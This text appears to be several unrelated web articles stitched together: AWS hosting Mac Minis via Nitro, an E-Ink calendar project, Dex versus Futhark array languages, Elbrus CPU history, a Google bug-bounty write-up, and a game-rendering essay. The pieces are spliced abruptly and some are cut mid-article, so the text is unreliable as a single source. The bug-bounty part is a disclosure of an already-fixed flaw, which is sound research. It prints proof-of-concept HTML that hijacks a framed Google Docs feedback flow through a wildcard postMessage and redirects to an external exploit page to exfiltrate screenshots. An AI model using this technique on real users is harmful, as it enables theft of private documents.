<p>AWS says it is using Thunderbolt to connect to the Mac Mini. Although most logos are covered up in AWS’s screenshot, we can see what appears to be (logo partially covered by a white label) a black Belkin Thunderbolt 3 cable on the bottom of the Nitro controller. Amazon said it is using Thunderbolt to connect its Nitro controller to the Mac Mini and provide its basic suite of EBS storage, networking, and security/ management features.</p>
<h2>Final Words</h2>
<p>Something important to keep in mind here is that the Mac Mini itself is a relatively lower cost versus the rest of AWS’s infrastructure to host the node versus many of AWS’s other EC2 offerings. It is also much more complex than something like a <a href="https://www.servethehome.com/myelectronics-nl-apple-mac-mini-and-raspberry-pi-rack-review/">Mac in a Rack</a> setup that we recently featured on STH.</p>
<p><iframe title="Rackmount Apple Mac Mini and Raspberry Pi" width="696" height="392" src="https://www.youtube.com/embed/t__DW0NbJIs?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p>Overall, the big takeaway for our readers should be the impact of the AWS Nitro and why the industry is pushing so hard on DPUs right now. AWS is effectively using its Nitro controller as the endpoint so it can abstract the nodes it is putting on its network. Instead of having to re:Invent (yes that was purposeful) a new Mac OS stack, it could leverage Nitro and deliver its services over Thunderbolt. Some of the Thunderbolt changes in the M1 generation also may partially explain why AWS is using the older x86 nodes instead of newer M1 Arm nodes.</p>

<h3 id="building-an-e-ink-calendar-and-a-ui-toolkit-along-the-way">Building an E-Ink Calendar, and a UI Toolkit along the way</h3>
<p>Having worked from home for the better part of the year, I recently started to work on a new project. Building a E-Ink based dashboard which would keep track of my meetings among other things. Given the always-on nature of the E-Ink display, this would help me better manage by schedule during a typical work-day especially given I tend to miss Google Calendar notifications <em>a lot</em>. </p>
<p>This is what the end result looks like:</p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_end_result.jpg" alt="Top View" title="E-Ink Dashboard" width="640px">
</p>
<p>The app here is showing the next 5 Calendar events for <strong>a demo Google account</strong>.<br>
Looks nice and simple, does it not ?</p>
<h4 id="the-hardware">The Hardware</h4>
<p>I took an off-the-shelf approach for the hardware. I purchased an <a href="https://inkplate.io/">InkPlate 6</a> which was originally crowd-funded on <a href="https://www.crowdsupply.com/e-radionica/inkplate-6">CrowdSupply</a>.</p>
<p>The E-Ink display is from a recycled Kindle e-reader, which means its a pretty great display. It has 2 modes including a 2-bit per pixel gray-scale mode and monochrome. It supports partial updates in monochrome mode. The display is connected to a <code>ESP 32</code>, with built-in WiFi. All we need to do is to hookup the display to a PC via a USB cable and power it on. The display also comes with a nice 3D printed enclosure. </p>
<h4 id="the-software">The Software</h4>
<p>The InkPlate 6 supports MicroPython, and recently the libraries powering the display were <a href="https://github.com/e-radionicacom/Inkplate-6-micropython">opensourced</a>. This gave me a decent foundation to build on top-of.</p>
<h5 id="oauth2-support">OAuth2 support</h5>
<p>The first step to showing events from Google Calendar is to be able to complete an <code>OAuth2</code> flow. I decided to use the <a href="https://developers.google.com/identity/protocols/oauth2/limited-input-device">device flow</a> given the limited input capabilities of the ESP 32. </p>
<p>MicroPython does not have any libraries that work with <code>OAuth2</code>, so I decided to write one. Here is the <a href="https://github.com/micropython/micropython-lib/pull/407">PR</a> that I eventually made to the <a href="https://github.com/micropython/micropython-lib">micropython-lib</a> GitHub repo which adds support for this specification. This ended up being pretty straightforward, given my familiarity with OAuth2 (having authored <a href="https://github.com/openid/AppAuth-JS">this</a> library before).</p>
<h5 id="building-a-limited-ui-toolkit">Building a limited UI-Toolkit</h5>
<p>The <code>InkPlate</code> has a decent <a href="https://github.com/e-radionicacom/Inkplate-6-micropython/blob/master/gfx.py">Graphics</a> API, but rather than having to hard-code coordinates to render UI i decided to take minor detour and build a mini UI Toolkit from first principles based on the graphics primitives that were supported. I took a lot of inspiration from the <em>existing</em> Android UI View system and build a small subset of those APIs.</p>
<h6 id="measuring-text">Measuring text</h6>
<p>The first step was to be able to measure the text to be able to compute how much space <code>text</code> with a given <code>text size</code> would occupy on the screen. The <code>InkPlate</code> uses bitmap fonts, so i ended up using a look-up-table for widths and heights for individual letters for a given size. It's an approximation, but it worked well enough for me to proceed to the next step.</p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_step_1.jpg" alt="Top View" title="Step 1: Measuring text" width="640px">
</p>
<h6 id="columns-alignment-and-padding">Columns, Alignment and Padding</h6>
<p>Now that I had text measurements I could start drawing some text in <code>Columns</code> and <code>Rows</code> (these are the containers supported by the  custom layout system). I managed to also implement <code>padding</code> and text <code>alignments</code>. Not perfect, but still pretty good progress. </p>
<p>The image below consists of a single <code>Column</code> with a nested <code>Row</code> and a bunch of <code>Text</code> nodes in various alignments and sizes. The <code>10px</code> box on top is a component called <code>Spacer</code> which just occupies empty space on the screen.</p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_step_2.jpg" alt="Top View" title="Step 2: Columns, Padding &amp; Alignments" width="640px">
</p>
<h6 id="columnar-layouts-and-alignments">Columnar Layouts and alignments</h6>
<p>Now that I had some basic building blocks, I decided to go further and implement more complex layouts. I implemented support for <code>aligning</code> containers and fixed a lot of bugs when nesting containers. You can also see <code>text alignments</code> within individual <code>Column</code> containers working.</p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_step_3.jpg" alt="Top View" title="Step 3: Columnar Layouts &amp; Nested Containers" width="640px">
</p>
<h6 id="supporting-images">Supporting Images</h6>
<p>I finally added support for <code>Image</code> nodes to layouts. This is also when I started to add some much needed UI polish. </p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_step_4.jpg" alt="Top View" title="Step 4: Supporting Images &amp; Initial UI" width="640px">
</p>
<h6 id="miscellaneous-features">Miscellaneous Features</h6>
<p>I also worked on other additional features along the way, including:</p>
<ul>
<li>Support &amp; configuration for time zones. The MicroPython runtime on the ESP 32 does <em>not</em> ship with a Time Zone database and the real time clocks only support UTC seconds after epoch. </li>
<li>Support for token caching &amp; persistence. This was a big feature because this would mean that I could serialize the <code>auth state</code> on the device. This meant that I did not have to do the full <code>OAuth2</code> dance every single time I started the app.</li>
<li>A small <code>DateTime</code> library capable of formatting dates in a couple of different formats. </li>
<li>Support for <code>Deep Sleep</code>. This would allow the device to conserve power by not having to do anything. The device would only wake up once every <code>N</code> minutes to refresh the events in the <code>Calendar</code>. </li>
</ul>
<h4 id="summary">Summary</h4>
<p>This project was a <strong>lot of fun</strong>. I learnt a lot, especially given that I did not intend to build a UI Toolkit when I started working on the project). The toolkit i built is janky, but it is an accomplishment, considering I have never built one before. </p>
<p>MicroPython was incredible to prototype with (despite lacking a graphical debugger). I would highly recommending picking up a board that supports MicroPython for your next hardware project. The MicroPython community (libraries + forums) is also pretty active and helpful</p>
<h4 id="epilogue">Epilogue</h4>
<p>All the source code that I wrote for the project is on <a href="https://github.com/tikurahul/Inkplate-6-micropython">GitHub</a>. The entry point is a file called <a href="https://github.com/tikurahul/Inkplate-6-micropython/blob/master/app.py"> <code>app.py</code></a>. Bear in mind, that all of this code was written in ~ a week long period. I also plan on making some more minor improvements to the UI. </p>

</p>

<p><a href="https://github.com/google-research/dex-lang">Dex</a> is a functional array programming language developed by a team of researchers at Google. I recently re-read <a href="https://openreview.net/pdf?id=rJxd7vsWPS">their paper</a>, which got me excited enough to want to take a closer look. Dex and Futhark are more or less aimed at the same kinds of problems, so my interpretation of Dex is rooted in how it differs from Futhark. In this post I will describe some of the interesting differences based on <a href="https://futhark-lang.org/examples.html#examples-from-dex">translating five Dex example programs to Futhark</a>. I’m not a Dex expert, so maybe I’ve missed a thing here or there.</p>
<p>Futhark wasn’t originally designed to be a user-facing programming language. We were doing research in compiler optimisations for parallel computers, and the language was just a crude little thing so we could write programs for our optimiser to work on. Over time the language grew and eventually became fairly pleasant to use (<a href="https://futhark-lang.org/blog/2017-12-27-reflections-on-a-phd-accidentally-spent-on-language-design.html">full story here</a>), but it was still never designed as a cohesive or novel approach to array programming. That also means it’s fairly conventional or even old-fashioned, as functional languages go. In contrast, Dex’s authors had more imagination and designed their language from the start with novel ideas, chief of which is to consider <em>index sets as types</em>. To illustrate the idea, here is how to compute all-pairs L₁ distances in Dex:</p>
<pre><code>pairwiseL1 ::  n=&gt;d=&gt;Real -&gt; n=&gt;n=&gt;Real
pairwiseL1 x = for i j.sum (for k. abs (x.i.k - x.j.k))</code></pre>
<p>The <code>n=&gt;d=&gt;Real</code> is the type of an <code>n</code> by <code>d</code> array of <code>Real</code>s. Dex leans heavily on an analogy between arrays and functions, as arrays can be seen as merely functions from indexes to values. In Futhark, we’d write this type as <code>[n][d]Real</code>. Note that in Dex, <code>n</code> and <code>d</code> are completely abstract type parameters, while in Futhark they are term-level variables.</p>
<p>The real advantage of Dex’s approach is that it permits a very lightweight notation for index spaces. For example, <code>for i j.e</code> produces a two-dimensional array where each element is given by the expression <code>e</code>, and the type checker figures out the span of <code>i</code> and <code>j</code> based on the context. For example, in <code>for k</code>, Dex figures out that <code>k</code> must be part of the index set <code>d</code>, because it is used to index the innermost dimension of <code>x</code>. Pretty cool!</p>
<p>A naive translation to Futhark would be this:</p>
<div id="cb2"><pre><code><span id="cb2-1"><span>let</span> pairwiseL1 [n][d] (x: [n][d]f64) =</span>
<span id="cb2-2">  tabulate_<span>2</span>d n n (\i j -&gt; f64.sum (tabulate d (\k -&gt; x[i,k] - x[j,k])))</span></code></pre></div>
<p>Note that the tabulation functions require explicit size-passing, and that the indexes are just integers - the type checker will not help us if we accidentally use the <code>k</code> along the wrong dimension.</p>
<p>Of course, the above is not how you’d actually write this program in Futhark. Instead you’d first define a function for computing the L₁ distance:</p>
<div id="cb3"><pre><code><span id="cb3-1"><span>let</span> L1 [n] (xs: [n]f64) (ys: [n]f64) : f64 =</span>
<span id="cb3-2">  map2 (-) xs ys |&gt; map f64.abs |&gt; f64.sum</span></code></pre></div>
<p>And then you’d apply it to all the pairs:</p>
<div id="cb4"><pre><code><span id="cb4-1"><span>let</span> pairwiseL1 [n][m] (xss: [n][m]f64) : [n][n]f64 =</span>
<span id="cb4-2">  map (\a -&gt; map (\b -&gt; L1 a b) xss) xss</span></code></pre></div>
<p>I think this program illustrates the main difference in philosophy between Dex and Futhark. While Dex uses dependent types to secure an index-based notation, Futhark instead encourages index-free programming. I suspect the two approaches are fundamentally equivalent, but it’s an interesting contrast that I think is due to the two language’s different backgrounds. Dex is specifically designed to implement scientific code and formulae, which is traditionally very index-oriented. Futhark is more about supporting a “traditional” combinator-based functional programming style, but just making it run much faster. You could view Futhark as a data-parallel ML, while Dex is <a href="https://en.wikipedia.org/wiki/Einstein_notation">higher-order dependently typed Einstein summation</a>.</p>
<p>I also suspect this focus on indexes is because the Dex authors have a background of being frustrated with NumPy-style programming, where the absence of efficient indexing can be quite restrictive. They even even use this NumPy implementation of L₁ distances as motivation in their paper:</p>
<pre><code>def pairwiseL1(x):
  return sum(abs(x.T - x[..., newaxis]), axis=1)</code></pre>
<p>I certainly agree that this is hard to read.</p>
<h2 id="the-good-ones"><a href="#the-good-ones" id="the-good-ones-link" title="the-good-ones">The good ones</a></h2>
<p>Porting a two-line Dex program to Futhark is enough to wax philosophically for a paragraph or two, but it’s still a pretty shallow comparison. Therefore, I also ported five of <a href="https://github.com/google-research/dex-lang/tree/main/examples">the Dex example programs</a>, plus whatever of the <a href="https://github.com/google-research/dex-lang/blob/main/lib/prelude.dx">Dex prelude</a> I needed along the way. I’m not going to claim that I ported the five most difficult programs, but at least one of them was quite complicated. The Futhark programs total about 450 lines of code (excluding comments and blanks).</p>
<p>My general impression is that when it comes to expressing parallelism, Dex and Futhark are about equivalent. Dex’s index notation is more concise, but I personally find it slightly easier to understand and decompose Futhark expressions. As an example, this Dex function computes the covariance of a matrix:</p>
<pre><code>def covariance (n:Type) ?-&gt; (d:Type) ?-&gt;
    (xs:n=&gt;d=&gt;Float) : (d=&gt;d=&gt;Float) =
   xsMean :    d=&gt;Float = (for i. sum for j. xs.j.i) / IToF (size n)
   xsCov  : d=&gt;d=&gt;Float = (for i i'. sum for j.
                           (xs.j.i' - xsMean.i') *
                           (xs.j.i  - xsMean.i )   ) / IToF (size n - 1)
   xsCov</code></pre>
<p>In Futhark we write it as:</p>
<div id="cb7"><pre><code><span id="cb7-1"><span>let</span> covariance0 [n] (xs:[n]f64) (xsm:f64) (ys:[n]f64) (ysm:f64) =</span>
<span id="cb7-2">  f64.sum (map2 (\x y -&gt; (x-xsm) * (y-ysm)) xs ys) / f64.i64 (n<span>-1</span>)</span>
<span id="cb7-3"></span>
<span id="cb7-4"><span>let</span> covariance [n][d] (xs:[n][d]f64) =</span>
<span id="cb7-5">  <span>let</span> xsT = transpose xs</span>
<span id="cb7-6">  <span>let</span> means = map mean xsT</span>
<span id="cb7-7">  <span>in</span> map2 (\a a_mean -&gt;</span>
<span id="cb7-8">             map2 (\b b_mean -&gt; covariance0 a a_mean b b_mean)</span>
<span id="cb7-9">                  xsT means)</span>
<span id="cb7-10">          xsT means</span></code></pre></div>
<p>It’s certainly more verbose, but I had to read the Dex function carefully to understand what the indexes implied, while I have a much easier time understanding the structure of the computation from the Futhark formulation. Of course, I also have years of experience with Futhark, compared to just days with Dex.</p>
<p>Most of the translations were pretty simple, for example the <a href="https://futhark-lang.org/examples/dex-mandelbrot.html">Mandelbrot set</a>, <a href="https://futhark-lang.org/examples/dex-pi.html">Monte Carlo pi</a>, and <a href="https://futhark-lang.org/examples/dex-brownian-motion.html">Brownian motion</a> programs. One difference that made me feel <em>major</em> jealousy is that the <code>dex script</code> command is also able to generate <a href="https://google-research.github.io/dex-lang/mandelbrot.html">pleasant reports</a> containing both the code and visualisations and plots of various values. We definitely need a tool like this for Futhark!</p>
<p>The <a href="https://futhark-lang.org/examples/dex-sierpinski.html">Sierpinski triangle</a> program has a fun little detail in Dex, which is that the <code>randIdx</code> function uses the Dex type system to determine the range of the index being produced. While the <code>randIdx</code> function itself can still be wrong, this makes it hard to <em>use</em> it incorrectly. The Futhark translation of <code>randIdx</code> asks the user to pass in a range explicitly, and also returns just an integer.</p>
<h2 id="the-bad-one"><a href="#the-bad-one" id="the-bad-one-link" title="the-bad-one">The bad one</a></h2>
<p>The largest ported example by far is <a href="https://futhark-lang.org/examples/dex-raytrace.html">a ray tracer</a>. It uses ray marching with <a href="https://en.wikipedia.org/wiki/Signed_distance_function">signed distance functions</a> to describe objects. The Dex program rather casually uses the <code>grad</code> operator to apply <a href="https://en.wikipedia.org/wiki/Automatic_differentiation">automatic differentiation (AD)</a> to compute surface normals from the distance function. This is a really elegant technique, but Futhark does not (yet!) have a <code>grad</code> operator. In Futhark, the sensible thing to do is to hard-code the gradient functions for the three different kinds of objects, so of course I instead used <a href="https://futhark-lang.org/examples/dual-numbers.html">forward-mode AD with dual numbers</a> implemented via the Futhark module system. The resulting code finally convinced me that built-in AD is a necessity for a modern numerical languages. I was on the fence before, since I worry that doing it well will be invasive in both the language and compiler, but I never want to write this kind of boilerplate again.</p>
<p>The rest of the ray tracer was fairly straightforward to implement. Dex uses its effect system to implement the loop where the lights in the scene apply their contributions to a given point, which I wrote in Futhark as basically a fold. In fact, I didn’t yet find a Dex example where the effect system was more than a small notational convenience. I’m sure there’s one, though! Effect systems are not things you just add on a lark.</p>
<p>There was one part that confused me initially, but which makes perfect sense in retrospect. The ray tracer normalises the intensity of all pixels (triples of floats) based on the average intensity (unusual I think, but fine). In Dex this is done like this:</p>
<pre><code>image / mean (for (i,j,k). image.i.j.k)</code></pre>
<p>When I first read this, I couldn’t figure out whether it was normalising <em>per channel</em>. I always get a bit wary when overloaded operators like that <code>/</code> are involved. Of course, that <code>for</code>-expression is over a <em>single</em> index that just happens to be a triple, and the components of which are then used to index the three-dimensional <code>image</code> array. It’s really just flattening the array, and the type checker makes the individual <code>i</code>, <code>j</code> and <code>k</code>s take on the appropriate value.</p>
<h2 id="conclusions"><a href="#conclusions" id="conclusions-link" title="conclusions">Conclusions</a></h2>
<p>With respect to expressing parallelism, Dex and Futhark seem equivalent in expressive power, but Dex has the edge in concision. I’d be curious about going the other way, and porting some of the original Futhark benchmark programs <em>to</em> Dex, like <a href="https://github.com/diku-dk/futhark-benchmarks/blob/master/finpar/LocVolCalib.fut">local volumetric calibration</a>.</p>
<p>Dex has several small conveniences over Futhark: while the effect system didn’t matter much for the examples I looked at, Dex’s type classes and broadcasting operators did help a bit with making things more concise.</p>
<p>If you need AD, then Dex is miles ahead of Futhark. While I managed to implement the surface normals in the ray tracer, I gave up on porting <a href="https://google-research.github.io/dex-lang/mcmc.html">mcmc.dx</a> because it contains a higher-order function that applies the <code>grad</code> operator to a functional argument. This would have to be implemented with a higher order parametric module (<a href="https://futhark-lang.org/blog/2019-12-18-design-flaws-in-futhark.html#higher-order-modules">which I wrote were useless not long ago</a>), but I just didn’t have the heart for it. I’ll keep this as a usage case for when we implement AD properly.</p>
<p>I didn’t look much at performance, since Dex is sparsely documented and the benchmarking tools seem to be mostly for internal use. I performed a rough timing of sequential execution of the ray tracer, where the Futhark and Dex versions are about equally fast. Dex also has multi-threaded and CUDA backends, but I …</p></div></div>

<div><p>Before we look at the IcepeakITX ELBRUS-8CB motherboard lets first look at the history of Elbrus. </p><p>Elbrus CPU’s have been around for a very long time although unless you’re from Russia you’ve likely never heard of them. </p><p>They were first released in the early 1970’s and used in the Soviet space program, nuclear weapons research and defence systems as well as for research. </p></div>

<p>Over the years Elbrus have used several different architectures including: SPARC, x86 and Elbrus 2000.<br>Back in 2014 ELBRUS released the Elbrus-4C CPU which was designed for home and office use within Russia. Performance wasn’t great and as it couldn’t fully support x86. Computers using the Elbrus-4C CPU shipped with a custom proprietary Linux distro named Elbrus OS. Little is known about the success of this platform and they are never seen in the western world. I tried to buy an Elbrus-4C computer and have it shipped from Russia to the UK back in 2015 and it proved impossible. <br></p>

                    <p>By <a href="https://twitter.com/kl_sree">KL Sreeram</a></p><p>Google has integrated a <a href="https://www.google.com/tools/feedback">feedback sharing mechanism</a> for many of its products like Google Docs, Google Sheets and so on. This feature is supposed to help users report bugs and broken functionality to Google developers who could then work on fixing it.</p><h2 id="sending-feedback-in-google-products">Sending Feedback in Google Products</h2><p>You might have noticed a <strong>Send Feedback </strong>button at the bottom of the page while using Google Docs. It's a harmless feature, and its implemented as a feed back sharing system for Google Docs when you encounter issues. When you click on the button, a popup would appear asking you to describe the problem and this feature automatically takes a screenshot, sending (uploading) the data to Google for further review.</p><figure><img src="https://savebreach.com/content/images/2020/12/image-22.png" alt=""><figcaption>The "Send Feedback" popup in Google Docs</figcaption></figure><p>This feedback sharing feature is also implemented in many other Google products using an iFrame, embedded into the parent page (the Google Product).</p><p>This made me wonder how Google was displaying this image. I found, the image was being uploaded to Google via postMessage, and then rendered in the popup box before being sent to Google for further investigation.</p><h2 id="the-bug">The Bug</h2><p>There was some cross-origin communication happening between docs.google.com, www.google.com and feedback.googleusercontent.com (which was a sandboxed domain). Even after trying a lot I was unable to find any XSS in feedback.googleusercontent.com which could have helped me in stealing the screenshot image data.</p><p>Below is a graphical representation of the steps in this process – </p><figure><img src="https://savebreach.com/content/images/2020/12/image-23.png" alt=""><figcaption>How the screenshot was uploaded to Google servers</figcaption></figure><p>The following <code>postmessage</code> function sent the data to feedback.googlusercontent.com, however the postmessage configuration didn't allow other domains to be iFramed.</p><pre><code>windowRef.postmessage("&lt;Data&gt;","https://feedback.googleusercontent.com");</code></pre><p>However, the final <code>postmessage</code> function upon submitting the feedback was configured in a manner that allowed modifying the iFrame to an evil website</p><pre><code>windowRef.postmessage("&lt;Data&gt;","*");</code></pre><p>The wildcard scope allowed the <code>postmessage</code> data to be sent to an evil attacker controlled domain. The security misconfiguration here is the wildcard scope <code>*</code> &nbsp;that allowed me to steal and hijack Google Docs screenshots which were meant to be uploaded to Google's servers</p><p>Also, worth noting that the exploit worked in this case as Google Docs, by design has no <code>X-Frame-Options header</code>, which eventually helped exploit the cross-origin communication (through postMessage), although they do have some other protection against clickjacking and similar attacks as most features are disabled when the Google Docs pages are embedded in an iFrame.</p><h2 id="the-final-exploit">The Final Exploit</h2><p>Finally, I was able to put together all these vulnerabilities, in order to extract the Google Docs page screenshot by embedding it in a malicious iFrame and using <code>window.frames.frame.location</code> to load my exploit page from an external domain and steal user's Google Docs page screenshot</p><pre><code>&lt;html&gt;
    &lt;iframe src="https://docs.google.com/document/document_ID" /&gt;
    &lt;script&gt;
       //pseudo code
        
        
        setTimeout(function(){ alert("Hello"); }, 6000);

        function exp(){
        setInterval(function(){ 
         window.frames[0].frame[0][2].location="https://geekycat.in/exploit.html";
        }, 100);
        }
    &lt;/script&gt;
&lt;/html&gt;</code></pre><p>The above exploit gets triggered only once the user clicks on <strong>Send Feedback </strong>button. For allowing the iFrame to load, a setTimeout function executes every 6s (or, 6000 ms). To hijack the frame once it loads – the setInterval is used which tries to change the location of the iFrame every 100 ms to ensure the screenshot is stolen once the iFrame loads.</p><p>This could have allowed any attacker to steal sensitive information about your Google Docs documents and presentations, since organizations use it as part of G Suite for managing highly sensitive information. Although, this attack needs some user interaction but its not impossible given an attacker can easily convince a victim to perform the needed interaction (button click).</p><p>The <code>exploit.html</code> contains a postMessage event listener that captures the URL of the uploaded image, and the attacker successfully exfiltrates the Google Docs page screenshot in this way.</p><h2 id="video-poc-of-the-exploit">Video PoC of the Exploit</h2><p>Below is a Proof of Concept video of how the exploit worked, and how it could have allowed any attacker to steal screenshots of your private Google Docs documents by loading it in an iFrame on an attacker controlled website.</p><figure><iframe width="356" height="200" src="https://www.youtube.com/embed/isM-BXj4_80?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><h2 id="the-bounty">The Bounty</h2><p>Google rewarded <strong>$3133.7</strong> &nbsp;for this bug under their VRP program.</p><p><a href="https://twitter.com/kl_sree">KL Sreeram</a> is a security researcher and bug bounty hunter. He is one of the top researchers in the Google VRP program. This bug was first documented by KL Sreeram on his <a href="https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/">blog</a>.</p>

<h2>Intro</h2>



<p>This post will cover challenges and aspects of production to consider when creating new rendering / graphics techniques and algorithms – especially in the context of <strong>applied research for real time rendering</strong>. I will base this on my personal experiences, working on <strong>Witcher 2, Assassin’s Creed 4: Black Flag, Far Cry 4, and God of War</strong>.</p>



<p>Many of those challenges are easily ignored – they are <strong>real problems in production</strong>, but not necessarily there only if you only read about those techniques, or if you work on pure research, writing papers, or create tech demos.</p>



<p>I have seen statements like “why is this brilliant research technique X not used in production?” both from gamers, but also from my colleagues with academic background. And there are always some good reasons!</p>



<p>The post is also inspired by <a href="https://twitter.com/bartwronsk/status/1327509557015310336">my joke tweet</a> from a while ago about appearing smart and mature as a graphics programmer by “dismissing” most of the rendering techniques – that they are not going to work on foliage. 🙂&nbsp;And yes, I will come back to vegetation rendering a few times in this post.</p>



<p>I tend to think of this topic as well when I hear discussions about how “photogrammetry, raytracing, neural rendering, [insert any other new how topic] will be a universal answer to rendering and replace everything!”. Spoiler alert: not gonna happen (soon).</p>



<h2>Target audience</h2>



<p>Target audience of my post are:</p>



<ul><li>Students in computer graphics and applied researchers,</li><li>Rendering engineers, especially ones earlier in their career – who haven’t built their intuition yet,</li><li>Tech artists and art leads / producers,</li><li>Technical directors and decision makers without background in graphics,</li><li>Hardware engineers and architects working on anything GPU or graphics related (and curious what makes it complicated to use new HW features),</li><li>People who are excited and care about game graphics (or real time graphics in general) and would like to understand a bit “how sausages are made”. Some concepts might be too technical and too much jargon, but then feel free to skip those.</li></ul>



<p>Note that I didn’t place “pure” academic researchers in the above list – as I don’t think that pure research should be considering too many obstacles. Role of the fundamental research is inspiration and creating theory that can be later productionized by people who are experts in productionization.</p>



<p>But if you are a pure researcher and somehow got here, I’ll be happy if you’re interested in what kinds of problems might be on the long way from idea or paper to a product (and <strong>why most new genuinely good research will never find its place in products</strong>).</p>



<h2>How to interpret the guide</h2>



<p>Very important note – <strong>none </strong>of the “obstacles” I am going to describe <strong>are deal breakers</strong>.</p>



<p>Far from it – most successful tech that became state of the art violates many of those constraints! It simply means that those are challenges that will need to be overcome in some way – manual workarounds, feature exclusivity, ignoring the problems, or applying them only in specific cases.</p>



<p>I am going to describe first the <strong>use-cases</strong> – potential uses of the technology and how those impact potential requirements and constraints.</p>



<h2>Use case</h2>



<p>The categories of “use cases” deserve some explanation and description of “severity” of their constraints.</p>



<h3>Tech demo&nbsp;</h3>



<p>Tech demo is the easiest category. If your whole product is a <strong>demonstration of a given technique </strong>(whether for benchmarking, showing off some new research, artistic demoscene), most of the considerations go away.</p>



<p>You can actually retrofit everything: from the demo concept, art itself, camera trajectory to show off the technology the best and avoid any problems.</p>



<p>The main considerations will be around performance (a choppy tech demo can be seen as a tech failure) and working very closely with artists able to show it off.</p>



<p>The rest? Hack away, write one-off code – just don’t have expectations that turning a tech demo into a production ready feature is simple or easy (it’s more like the 99% of work remaining).</p>



<h3>Special level / one-off</h3>



<p>The next level “up” in the difficulty is creating some <strong>special features that are one-off</strong>. It can be some visual special effect happening in a single scene, game intro, or a single level that is different from the other ones. In this case, a feature doesn’t need to be very “robust”, and often replaces many others.</p>



<p>An example could be lighting in the jungle levels in Assassin’s Creed 4: Black Flag that I worked on.&nbsp;</p>



<div><figure><img src="https://lh3.googleusercontent.com/51bdx_bCzH7HBQ7NjppuafWVspC1jLwJ4OwbTLwYq1DLDnnOlxNGZtXby8mLGdqhnjC00WyxAfq1L3d8EIOatPflkT4phHF4Xq2WxOeUSlRCymYNEPQW3WiOeywiz8edAD592PNh" alt="" width="458" height="610"><figcaption>Source: Assassin’s Creed 4: Black Flag promo art. Notice the caustics-like lightshafts that were key rendering feature in jungle levels – and allowed us to save a lot on the shadows rendering!</figcaption></figure></div>



<p>Jungles were “cut off” from the rest of the open world by special streaming corridors and we completely replaced the whole lighting in them! Instead of relying on tree shadow maps and global lighting, we created <strong>fake “caustics”</strong> that looked much softer and played very nicely with our volumetric lighting / atmospherics system. They not only looked better, but also were much faster – obviously worked only because of those special conditions.</p>



<h3>Cinematics</h3>



<p>A slightly more demanding type of feature is cinematic-only one. Cinematics are a bit different as they can be very strictly controlled by cinematic artists and <strong>most of their aspects like lighting, character placement, or animations are faked</strong> – just like in regular cinema! Cinematics often feature fast camera cuts (useful to hide any transitions/popping) and have more computational budget due to more predictable nature (and even in 60fps console games rendered in 30fps).</p>

<h3>Regular rendering feature</h3>



<p>“Regular” features – lighting, particles, geometry rendering – are the <strong>hardest category</strong>. They need to be either very easy to implement (most of the obstacles / problems solved easily), provide huge benefits surpassing state of the art by far to facilitate the adoption pain, or have some very excited team pushing for it (never underestimate the drive of engineers or artists that really want to see something happen!).</p>



<p>Most of my post will focus on those.&nbsp;</p>



<h3>Key / differentiating feature</h3>



<p>Paradoxically, if something is a key or differentiating feature, this can alleviate many of the difficulties. Let’s take VR – there stereo, performance (low latency), and perfect AA with no smudging (so rather forget about TAA), are <strong>THE features and absolutely core to the experience</strong>. This means that you can completely ignore for example rendering foliage or some animations that would look uncannily – as being immersed and the VR experience of being there are much more important!</p>



<h2>Feature compatibility</h2>



<p>Let’s have a look at compatibility of a newly developed feature with some other common “features” (the distinction between “features”, and the next large section “pipeline” is fuzzy).</p>



<p>Features are not the most important of challenges – arguably the category I’m going to cover at the end (the “process”) is. But those are fun and easy to look at!&nbsp;</p>



<h3>Dense geometry</h3>



<p>Dense geometry like <strong>foliage </strong>– a “feature” that inspired this post – is an enemy of most rendering algorithms.</p>



<p>The main problem is that with very dense geometry (lots of overlapping and small triangles), many “optimizations” and assumptions become impossible.</p>



<p>Early Z and occlusion culling? Very hard.&nbsp;</p>



<p>Decoupling surfaces from volumes? Very hard.</p>



<p>Storing information per unique surface parametrization? Close to impossible.</p>



<p>Amount of vertices to animate and pixels to shade? Huge, shaders need simplification!</p>



<div><figure><img src="https://lh4.googleusercontent.com/P3m7eTgVGodadf6TSd7Ca4Th8wedlR3AEr0wghmVTz0klnfU2hUTq4K1jRdhLljGMRQKgiG-pq02Ayc5Dtllma_jLOF60rtSCx0jID78CYen8cyAW3z2N_bCPYh7KvemZ2k8bWIX" alt=""><figcaption>Witcher 2 foliage – that density! Still IMO one of the best forests in any game.</figcaption></figure></div>



<p>Dense geometry through which you can see (like grass blades) is incompatible with many techniques, for example lightmapping (storing a precomputed lighting per every grass blade texel would be very costly).</p>



<p>If a game has a tree here and there or is placed in a city, this might not be a problem. But for any “natural” environment, a big chunk of the productionization of any feature is going to be combining it to coexist well with foliage.</p>



<h3>Alpha testing</h3>



<p>Alpha testing is an extension of the above, as it disables even more hardware features / optimizations.</p>



<p>Alpha testing is a technique, when a pixel evaluates “alpha” value from a texture or pixel shader computations, and <strong>based on some fixed threshold, doesn’t render/write it</strong>.</p>



<p>It is much faster than alpha blending, but for example disables early z writes (early z tests are ok), and requires raytracing hit shaders and reading a texture to decide if a texel was opaque or not.</p>



<p>It also makes antialiasing very challenging (forget about regular MSAA, you have to emulate alpha to coverage…).</p>



<p>For a description and great visual explanation of some problems, see this blog post of <a href="https://bgolus.medium.com/anti-aliased-alpha-test-the-esoteric-alpha-to-coverage-8b177335ae4f">Ben Golus</a>.</p>



<h3>Animation – skeletal</h3>



<p>Most animators work with “skeletal animations”. <strong>Creating rigs, skinning meshes, animating skeletons</strong>. When you create a new technique for rendering meshes that relies on some heavy precomputations, would animators be able to “deform” it? Would they be able to plug it into a complicated animation blending system? How does it fit in their workflow?</p>



<p>Note that it can also mean rigid deformations, like a rotating wheel – it’s much cheaper to render complicated objects as a skinned whole, than splitting them.</p>



<p>And animation is a must, cannot be an afterthought in any commercial project.</p>



